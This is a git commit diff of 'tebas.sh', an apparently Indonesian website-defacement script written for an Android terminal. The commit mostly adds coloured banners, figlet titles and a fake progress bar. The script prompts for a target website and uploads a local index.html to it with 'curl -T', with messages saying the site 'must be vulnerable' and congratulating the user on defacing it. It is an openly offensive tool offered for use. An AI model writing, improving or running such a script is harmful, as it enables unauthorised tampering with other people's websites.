f0e72de1f3309f5545a04c8050d4e0c78548ac92
MonkeyOren <52753750+MonkeyOren@users.noreply.github.com>
2019-09-13 22:20:24 +0700

    Add files via upload

--- tebas.sh
+++ tebas.sh
@@ -7,17 +7,27 @@ white='\033[37;1m'
 yellow='\033[33;1m'
 clear
 
-echo $purple "#########################
-##                     ##
-## REBUILD: M0nK3y Or3N##
-##     *TEBAS INDEX*   ##
-#########################"
+echo $red"#########################"
+echo $red"##                     ##"
+echo $red"##"$white "BUILD: M0nK3y Or3N" $red    "##"
+echo $white"##"$red "   *TEBAS INDEX*  " $white    "##"
+echo $white"#########################"
+sleep 1
 
+echo $red
 figlet "Tebas Index"
-figlet "Rebuild by"
+sleep 1
+echo $white
+figlet "Build By"
+sleep 0.5
+echo $yellow
 figlet "Monk3y Or3N"
 echo $red"SCRIPT DEFACE HARUS BERNAMA Index.html"
-echo $red"SCRIPT DEFACE HARUS DI MEMORI INTERNAL DILUAR FOLDER"
+sleep 1
+echo $green"SCRIPT DEFACE HARUS DI MEMORI INTERNAL DILUAR FOLDER"
+sleep 1
+echo $cyan"WEBSITE HARUS VULN"
+sleep 2
 read -p "Masukin Target Website Anda:=>" Website
 clear
 sleep 1
@@ -26,8 +36,25 @@ sleep 1
 echo $blue"tunggu Lagi Dalam Proses Tebass"
 sleep 1
 curl -T /sdcard/index.html $Website
-sleep 2
+clear
 
+sleep 0.5
+echo $red"Loading.."
+echo $red"█▒▒▒▒▒▒▒▒▒"
+sleep 0.6
+echo $red"10%"
+echo $red"███▒▒▒▒▒▒▒"
+sleep 0.4
+echo $yellow"30%"
+echo $yellow"█████▒▒▒▒▒"
+sleep 0.4
+echo $yellow"50%"
+echo $yellow"███████▒▒▒"
+sleep 0.4
+echo $green"100%"
+echo $green"██████████"
+sleep 1
 echo $cyan"NICE Tertebass Website Nya :) ==>>" $Website
-
+sleep 1
 figlet "Terimakasih"
+
